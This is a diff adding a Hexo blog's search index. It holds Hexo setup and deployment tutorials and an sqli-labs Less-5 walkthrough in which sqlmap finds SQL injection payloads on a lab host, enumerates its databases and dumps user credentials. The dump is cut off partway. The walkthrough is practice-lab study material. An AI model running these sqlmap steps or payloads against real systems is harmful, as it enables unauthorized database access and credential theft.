@@ -1,0 +1,342 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hello World</title>
+    <url>/2020/09/21/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>hexo use</category>
+      </categories>
+      <tags>
+        <tag>sql_injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo install</title>
+    <url>/2021/01/18/hexo%20install/</url>
+    <content><![CDATA[<h2 id="use-hexo-to-build-blog"><a href="#use-hexo-to-build-blog" class="headerlink" title="use hexo to build blog"></a>use hexo to build blog</h2><p>Hexo 博客框架比较成熟，出了问题，网上可以搜索到很多的解决方式，无论是 Windows 还是 Linux，操作其实都是差不多的</p>
+<h2 id="envirenment"><a href="#envirenment" class="headerlink" title="envirenment"></a>envirenment</h2><p>提前装好 Git</p>
+<h3 id="install-Nodejs"><a href="#install-Nodejs" class="headerlink" title="install Nodejs"></a>install Nodejs</h3><p>下载 nodejs：<code>https://nodejs.org/en/</code></p>
+<p><img src="https://i.loli.net/2021/01/15/gbrsTJOC4FPQoHw.png" alt="image-20210115231518355"></p>
+<p>安装直接点击下一步、下一步就可以了。</p>
+<p>安装完以后会有两个组件：1.是 npm 包管理器；2.是 Nodejs 本身。</p>
+<p><strong>如果是 mac，需打开终端切换到 root 用户:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
+<p>输入密码，敲回车。</p>
+<p><img src="https://i.loli.net/2021/01/15/RGgpPhdoiUzFSOJ.png" alt="image-20210115231600936"></p>
+<p>输入<code>clear</code>清一下。</p>
+<p>查看 node 的版本：<code>node -v</code></p>
+<p>查看 npm 包管理器的版本：<code>npm -v</code></p>
+<p><strong>Windows 电脑我是直接以管理员身份打开 cmd，输入:</strong></p>
+<p>查看 node 的版本：<code>node -v</code></p>
+<p>查看 npm 包管理器的版本：<code>npm -v</code></p>
+<p>因为 Hexo 需要 Nodejs 支持的、生成的，所以这是前置步骤。</p>
+<h2 id="install-Hexo-blog-frame"><a href="#install-Hexo-blog-frame" class="headerlink" title="install Hexo blog frame"></a>install Hexo blog frame</h2><p>需借助 npm 包管理器来安装。因为国内安装镜像源很慢，所以利用 npm 安装 cnpm。</p>
+<h3 id="use-taobao-to-install"><a href="#use-taobao-to-install" class="headerlink" title="use taobao to install"></a>use taobao to install</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
+
+<p>敲<code>cnpm</code>就可以自动补全了，这个工具说明就有了。</p>
+<p>看下 cnpm 的版本：<code>cnpm -v</code></p>
+<p>这个是mac的截图，Windows一样操作</p>
+<p><img src="https://i.loli.net/2021/01/15/5KmfY8QnDyTpUMC.png" alt="image-20210115231626939"></p>
+<h3 id="install-Hexo-frame："><a href="#install-Hexo-frame：" class="headerlink" title="install Hexo frame："></a>install Hexo frame：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/15/pJA2y7cQkRiSwqd.png" alt="image-20210115231704463"></p>
+<p><code>hexo -v</code>来验证下。</p>
+<p>可以看到 Hexo 的博客框架是基于 node 的。</p>
+<p><img src="https://i.loli.net/2021/01/15/NSud6nqH1wysXkg.png" alt="image-20210115231747972"></p>
+<h2 id="run-Hexo-on-local-server"><a href="#run-Hexo-on-local-server" class="headerlink" title="run Hexo on local server"></a>run Hexo on local server</h2><h3 id="way01："><a href="#way01：" class="headerlink" title="way01："></a>way01：</h3><p>在开始之前，输入 pwd 看下所处路径。</p>
+<p>新建一个 blog 文件夹：<code>mkdir blog</code></p>
+<h3 id="way02："><a href="#way02：" class="headerlink" title="way02："></a>way02：</h3><p>我是直接在 E 盘自己手工创建了一个 blog 文件夹。</p>
+<p>所有博客的东西全部都在 blog 里面生成。<strong>所以大家如果出了什么错，直接连 blog 文件夹整个删除就行了。注意：千万不能只删除 blog 文件夹里面的内容，却不删除 blog 文件夹，这样操作会出问题的。</strong></p>
+<p>进入 blog 的目录中，位于这个目录下，就可以使用 Hexo 生成我们的博客。</p>
+<p>mac 下输入 sudo，表示用管理员的命令来执行，用 mac 电脑需要加上。</p>
+<p>初始化一个博客：<code>sudo hexo init</code></p>
+<p>初始化一个博客：<code>hexo init</code></p>
+<p>您看，它会自己去克隆。还会默认克隆一个 Landscape 主题:</p>
+<p><img src="https://i.loli.net/2021/01/15/eCTBhvwfMoEJP36.png" alt="image-20210115231816099"></p>
+<p><img src="https://i.loli.net/2021/01/15/WfwtRu9PZv5S2Jp.png" alt="image-20210115231857307"></p>
+<p>安装完成了！</p>
+<p>看该目录下的所有子目录和文件：<code>ls</code></p>
+<p>启动博客：<code>hexo s</code></p>
+<p>输入<code>localhost:4000</code>问下，看看博客是不是已经成功，已经有了，就像这样：</p>
+<p><img src="https://i.loli.net/2021/01/15/oRj7pwmdti8MgTs.png" alt="image-20210115231925489"></p>
+<h2 id="how-hexo-use："><a href="#how-hexo-use：" class="headerlink" title="how hexo use："></a>how hexo use：</h2><p><img src="https://i.loli.net/2021/01/15/pjSqdJbWgrnvPIR.png" alt="image-20210115232004249"></p>
+<p><code>hexo s</code>就是<code>hexo server</code> ，写一篇博客，可以用<code>hexo s</code>这个命令启动预览下。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo n &quot;我的第一篇博客文章&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/15/ihaIvrkHwV4zUWf.png" alt="image-20210115232033916"></p>
+<p>切换到 source，输入命令：<code>cd source/_posts/</code></p>
+<h3 id="use-vim："><a href="#use-vim：" class="headerlink" title="use vim："></a>use vim：</h3><p><img src="https://i.loli.net/2021/01/15/9niqf3NCFmELbvM.png" alt="image-20210115232055656"></p>
+<p>可以进行编辑，也可以不编辑直接发布。</p>
+<p>点击键盘的 i 进行编辑，shift 和 esc 同时按下(这里我记得是这样用的，如果不行可以百度下），然后输入<code>:wq</code>保存退出。这个不太好用，编辑用 Visual Studio Code 这个工具即可。</p>
+<p>这样博客文章就创建好了。</p>
+<p>输入 pwd，看到在 source 目录下，需要退 2 层回去：<code>cd ../..</code></p>
+<p><img src="https://i.loli.net/2021/01/15/ovCFUHyftBmb6AD.png" alt="image-20210115232123036"></p>
+<p>这样就到了 blog 目录。</p>
+<h3 id="input-command："><a href="#input-command：" class="headerlink" title="input command："></a>input command：</h3><p>清理下：<code>hexo clean</code></p>
+<p>生成下：<code>hexo g</code></p>
+<p>启动下：<code>hexo s</code></p>
+<p>刷新下：<code>http://localhost:4000</code></p>
+<p><img src="https://i.loli.net/2021/01/15/3rIsPL6gobZCxJ8.png" alt="image-20210115232200175"></p>
+<p>以上 Hexo 博客的搭建已经完成了。</p>
+<h2 id="deploy-to-remote（Github）"><a href="#deploy-to-remote（Github）" class="headerlink" title="deploy to remote（Github）"></a>deploy to remote（Github）</h2><p>1.登录自己的 Github。</p>
+<p>2.新建一个仓库：</p>
+<p>注意：<code>一定是你的昵称.github.io</code></p>
+<p><img src="https://i.loli.net/2021/01/15/Ts9RU3GElYaHZ8Q.png" alt="image-20210115232302638"></p>
+<p><img src="https://i.loli.net/2021/01/15/fyo3GS6g4c7X8Au.png" alt="image-20210115232335645"></p>
+<p><img src="https://i.loli.net/2021/01/15/Sl9tiG4aK8R2IWd.png" alt="image-20210115232407652"></p>
+<p>现在是个空仓库，地址是这个，先放着。</p>
+<h3 id="keep-going-on-installing-deployer-git："><a href="#keep-going-on-installing-deployer-git：" class="headerlink" title="keep going on installing deployer-git："></a>keep going on installing deployer-git：</h3><p>装 Git 部署的插件：<code>cnpm install --save hexo-deployer-git</code></p>
+<p><img src="https://i.loli.net/2021/01/15/9kv3DX2z5ZaIOjp.png" alt="image-20210115232443574"></p>
+<p>里面的红色警告可以忽略不管。</p>
+<p>去 blog 文件下，<code>直接看到一个_config.yml</code>，修改<code>_config.yml</code>即可。注意：<code>blog</code>文件夹下的其它文件下也有<code>_config.yml</code>文件，别改错了文件。</p>
+<h3 id="change-to-like-this："><a href="#change-to-like-this：" class="headerlink" title="change to like this："></a>change to like this：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https:&#x2F;&#x2F;github.com&#x2F;qinghan586&#x2F;qinghan586.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line">注意：deploy: type: repository: branch: 后面都有一个英文的空格。</span><br></pre></td></tr></table></figure>
+
+<p>用 nopad++修改后一定要保存！</p>
+<p>部署到远端：<code>hexo d</code></p>
+<h3 id="auto-deploy-need-to-input-username-and-password："><a href="#auto-deploy-need-to-input-username-and-password：" class="headerlink" title="auto deploy,need to input username and password："></a>auto deploy,need to input username and password：</h3><p><img src="https://i.loli.net/2021/01/15/mM5dWX96Ao8nyQN.png" alt="image-20210115232515695"></p>
+<p>往远端推成功后，刷新 Github 仓库，发现多了很多东西，这些就是我的博客内容：</p>
+<p><img src="https://i.loli.net/2021/01/15/Hw9Xj6fUeoWsxhr.png" alt="image-20210115232537441"></p>
+<p>访问<code>qinghan586.github.io</code>就可以直接打开，并看到博客部署到 Github 上去了。</p>
+<h3 id="download-beautyful-themes："><a href="#download-beautyful-themes：" class="headerlink" title="download beautyful themes："></a>download beautyful themes：</h3><p>好看的 Hexo 主题地址：<code>https://hexo.io/themes/</code></p>
+<p>自己来换个主题，克隆到 themes 主题下去：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;litten&#x2F;hexo-theme-yilia.git themes&#x2F;yilia</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;volantis-x&#x2F;hexo-theme-volantis.git themes&#x2F;volantis</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/15/3exnUmPafEG4tAV.png" alt="image-20210115232559154"></p>
+<p>themes 文件夹下就出现你下载的主题了。</p>
+<h3 id="apply-the-theme-on-blog："><a href="#apply-the-theme-on-blog：" class="headerlink" title="apply the theme on blog："></a>apply the theme on blog：</h3><p>修改<code>_config.yml</code>文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theme: yilia</span><br><span class="line">theme: volantis</span><br><span class="line">你用哪个主题就换哪个主题的名字，注意名称前面有个英文空格。</span><br></pre></td></tr></table></figure>
+
+<h3 id="input-the-command："><a href="#input-the-command：" class="headerlink" title="input the command："></a>input the command：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+<p>启动本地服务：<code>http://localhost:4000</code>看看，主题已经换了。</p>
+<p>推到远端（github）上去：<code>hexo d</code></p>
+<p>推送完成！</p>
+<p>访问<code>qinghan586.github.io</code>可看到主题成功换了！</p>
+<p>以上整个过程已经完成了。</p>
+<p>后续学下 css，然后才会把自己的博客修改的很漂亮。先搭建起来，再考虑博客内容美观的问题。</p>
+<h2 id="attention"><a href="#attention" class="headerlink" title="attention"></a>attention</h2><p>修改<code>_config.yml</code>文件后，需要把主题配置到博客上去，输入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+<p>推到远端（github）上去：<code>hexo d</code></p>
+<h3 id="if-it-does-not-work-do-like-the-following："><a href="#if-it-does-not-work-do-like-the-following：" class="headerlink" title="if it does not work,do like the following："></a>if it does not work,do like the following：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save&#96;&#96;hexo clean&#96;&#96;hexo generate&#96;&#96;hexo deploy</span><br></pre></td></tr></table></figure>
+
+<h3 id="if-occurred”-nothing-to-commit-working-tree-clean”"><a href="#if-occurred”-nothing-to-commit-working-tree-clean”" class="headerlink" title="if occurred” nothing to commit, working tree clean”"></a>if occurred” nothing to commit, working tree clean”</h3><p>do like this:</p>
+<p>我是这样提交文章成功的，依次输入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;one&quot;</span><br><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+<p><code>hexo s</code>后就出来了，域名本地都可以访问了。</p>
+<h3 id="if-can’nt-deploy-Hexo，and-the-files-on-Github-resposity-don’t-update"><a href="#if-can’nt-deploy-Hexo，and-the-files-on-Github-resposity-don’t-update" class="headerlink" title="if can’nt deploy Hexo，and the files on Github resposity don’t update"></a>if can’nt deploy Hexo，and the files on Github resposity don’t update</h3><p>删除 <code>.deploy_git</code>目录,再执行<code>hexo d -g</code>就可以了。</p>
+<p>Github 比较慢，刷新后需要耐心等待一下！</p>
+]]></content>
+      <categories>
+        <category>hexo use</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>others</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo quick start</title>
+    <url>/2021/01/18/hexo%20quick%20start/</url>
+    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
+<h2 id="Hexo-Quick-Start"><a href="#Hexo-Quick-Start" class="headerlink" title="Hexo Quick Start"></a>Hexo Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="Next-theme-setting"><a href="#Next-theme-setting" class="headerlink" title="Next theme setting"></a>Next theme setting</h2><h3 id="1-Install-next-through-curl"><a href="#1-Install-next-through-curl" class="headerlink" title="1.Install next through curl"></a>1.Install next through curl</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir themes&#x2F;next</span><br><span class="line">$ curl -s https:&#x2F;&#x2F;api.github.com&#x2F;repos&#x2F;iissnan&#x2F;hexo-theme-next&#x2F;releases&#x2F;latest | grep tarball_url | cut -d &#39;&quot;&#39; -f 4 | wget -i - -O- | tar -zx -C themes&#x2F;next --strip-components&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Update-the-next-theme"><a href="#2-Update-the-next-theme" class="headerlink" title="2.Update the next theme"></a>2.Update the next theme</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd themes&#x2F;next</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-Edit-the-config-yml-and-change-to-next-theme"><a href="#3-Edit-the-config-yml-and-change-to-next-theme" class="headerlink" title="3.Edit the _config.yml,and change to next theme"></a>3.Edit the _config.yml,and change to next theme</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## Themes: https:&#x2F;&#x2F;hexo.io&#x2F;themes&#x2F;</span><br><span class="line">#theme: landscape</span><br><span class="line">theme: next</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Next-has-four-style"><a href="#4-Next-has-four-style" class="headerlink" title="4.Next has four style"></a>4.Next has four style</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">scheme: Muse  &#x2F;&#x2F;默认主题</span><br><span class="line">#scheme: Mist</span><br><span class="line">#scheme: Pisces</span><br><span class="line">#scheme: Gemini</span><br></pre></td></tr></table></figure>
+
+<h2 id="Menu-setting"><a href="#Menu-setting" class="headerlink" title="Menu setting"></a>Menu setting</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># When running the site in a subdirectory (e.g. domain.tld&#x2F;blog), remove the leading slash (&#x2F;archives -&gt; archives)</span><br><span class="line"># the sequense</span><br><span class="line">menu:</span><br><span class="line">  home: &#x2F;</span><br><span class="line">  categories: &#x2F;categories&#x2F;</span><br><span class="line">  archives: &#x2F;archives&#x2F;</span><br><span class="line">  tags: &#x2F;tags&#x2F;</span><br><span class="line">  about: &#x2F;about&#x2F;</span><br><span class="line">  #sitemap: &#x2F;sitemap.xml</span><br><span class="line">  #commonweal: &#x2F;404&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Tags-setting"><a href="#Tags-setting" class="headerlink" title="Tags setting"></a>Tags setting</h3><h4 id="add-tags"><a href="#add-tags" class="headerlink" title="add tags"></a>add tags</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># add tags</span><br><span class="line">$ hexo new page &quot;tags&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="edit-index-md"><a href="#edit-index-md" class="headerlink" title="edit index.md"></a>edit index.md</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: All tags</span><br><span class="line">date: 2018-01-20 18:57:48</span><br><span class="line">type: &quot;tags&quot;    #this is need to add.</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<h3 id="other-Menu-options-is-the-same-to-tags"><a href="#other-Menu-options-is-the-same-to-tags" class="headerlink" title="other Menu options is the same to tags"></a>other Menu options is the same to tags</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  such as categories、about。after add categories (hexo new page &quot;categories&quot;)，创建的文件内容填写如下</span><br><span class="line">---</span><br><span class="line">title: All categories</span><br><span class="line">date: 2018-01-20 18:57:48</span><br><span class="line">type: &quot;categories&quot;## this is need to add</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<h2 id="add-search-in-the-site"><a href="#add-search-in-the-site" class="headerlink" title="add search in the site"></a>add search in the site</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-search --save</span><br><span class="line">$ npm install hexo-generator-searchdb --save</span><br><span class="line"></span><br><span class="line">#edit _config.yml</span><br><span class="line"># Local search</span><br><span class="line"># Dependencies: https:&#x2F;&#x2F;github.com&#x2F;flashlab&#x2F;hexo-generator-search</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  # if auto, trigger search by changing input</span><br><span class="line">  # if manual, trigger search by pressing enter key or search button</span><br><span class="line">  trigger: auto</span><br><span class="line">  # show top n results per article, show all results by setting to -1</span><br><span class="line">  top_n_per_article: 1</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>hexo use</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>others</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-lab notes not the same</title>
+    <url>/2020/09/22/sqli-lab-notes-less5/</url>
+    <content><![CDATA[<h2 id="sqli-labs-less5"><a href="#sqli-labs-less5" class="headerlink" title="sqli-labs-less5"></a>sqli-labs-less5</h2><h3 id="find-a-vulnerable-point"><a href="#find-a-vulnerable-point" class="headerlink" title="find a vulnerable point."></a>find a vulnerable point.</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET parameter &#39;id&#39; is vulnerable. Do you want to keep testing the others (if any)? [y&#x2F;N] N</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 9046&#x3D;9046 AND &#39;rjhe&#39;&#x3D;&#39;rjhe</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 3356 FROM(SELECT COUNT(*),CONCAT(0x716b7a7871,(SELECT (ELT(3356&#x3D;3356,1))),0x71626b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#39;OjIE&#39;&#x3D;&#39;OjIE</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 8875 FROM (SELECT(SLEEP(5)))zVCV) AND &#39;RNxr&#39;&#x3D;&#39;RNxr</span><br><span class="line">---</span><br><span class="line">[17:17:08] [INFO] the back-end DBMS is MySQL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="find-dbs"><a href="#find-dbs" class="headerlink" title="find dbs"></a>find dbs</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17:18:40] [INFO] fetching database names</span><br><span class="line">[17:18:42] [INFO] retrieved: &#39;information_schema&#39;</span><br><span class="line">[17:18:43] [INFO] retrieved: &#39;challenges&#39;</span><br><span class="line">[17:18:44] [INFO] retrieved: &#39;mysql&#39;</span><br><span class="line">[17:18:45] [INFO] retrieved: &#39;performance_schema&#39;</span><br><span class="line">[17:18:46] [INFO] retrieved: &#39;security&#39;</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] challenges</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] security</span><br></pre></td></tr></table></figure>
+
+<h3 id="find-tables"><a href="#find-tables" class="headerlink" title="find tables"></a>find tables</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1 -D security --tables</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17:19:55] [INFO] fetching tables for database: &#39;security&#39;</span><br><span class="line">[17:19:57] [INFO] retrieved: &#39;emails&#39;</span><br><span class="line">[17:19:58] [INFO] retrieved: &#39;referers&#39;</span><br><span class="line">[17:19:59] [INFO] retrieved: &#39;uagents&#39;</span><br><span class="line">[17:20:00] [INFO] retrieved: &#39;users&#39;</span><br><span class="line">Database: security</span><br><span class="line">[4 tables]</span><br><span class="line">+----------+</span><br><span class="line">| emails   |</span><br><span class="line">| referers |</span><br><span class="line">| uagents  |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="find-columns"><a href="#find-columns" class="headerlink" title="find columns"></a>find columns</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1 -D security -T users --columns</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17:21:00] [INFO] fetching columns for table &#39;users&#39; in database &#39;security&#39;</span><br><span class="line">[17:21:03] [INFO] retrieved: &#39;id&#39;</span><br><span class="line">[17:21:04] [INFO] retrieved: &#39;int(3)&#39;</span><br><span class="line">[17:21:05] [INFO] retrieved: &#39;username&#39;</span><br><span class="line">[17:21:06] [INFO] retrieved: &#39;varchar(20)&#39;</span><br><span class="line">[17:21:07] [INFO] retrieved: &#39;password&#39;</span><br><span class="line">[17:21:08] [INFO] retrieved: &#39;varchar(20)&#39;</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(3)      |</span><br><span class="line">| password | varchar(20) |</span><br><span class="line">| username | varchar(20) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="get-data"><a href="#get-data" class="headerlink" title="get data"></a>get data</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1 -D security -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17:22:25] [INFO] fetching entries of column(s) &#39;id, password, username&#39; for table &#39;users&#39; in database &#39;security&#39;</span><br><span class="line">[17:22:31] [INFO] retrieved: &#39;1&#39;</span><br><span class="line">[17:22:32] [INFO] retrieved: &#39;Dumb&#39;</span><br><span class="line">[17:22:33] [INFO] retrieved: &#39;Dumb&#39;</span><br><span class="line">[17:22:34] [INFO] retrieved: &#39;2&#39;</span><br><span class="line">[17:22:35] [INFO] retrieved: &#39;I-kill-you&#39;</span><br><span class="line">[17:22:36] [INFO] retrieved: &#39;Angelina&#39;</span><br><span class="line">[17:22:37] [INFO] retrieved: &#39;3&#39;</span><br><span class="line">[17:22:38] [INFO] retrieved: &#39;p@ssword&#39;</span><br><span class="line">[17:22:39] [INFO] retrieved: &#39;Dummy&#39;</span><br><span class="line">[17:22:40] [INFO] retrieved: &#39;4&#39;</span><br><span class="line">[17:22:42] [INFO] retrieved: &#39;crappy&#39;</span><br><span class="line">[17:22:43] [INFO] retrieved: &#39;secure&#39;</span><br><span class="line">[17:22:44] [INFO] retrieved: &#39;5&#39;</span><br><span class="line">[17:22:45] [INFO] retrieved: &#39;stupidity&#39;</span><br><span class="line">[17:22:46] [INFO] retrieved: &#39;stupid&#39;</span><br><span class="line">[17:22:47] [INFO] retrieved: &#39;6&#39;</span><br><span class="line">[17:22:48] [INFO] retrieved: 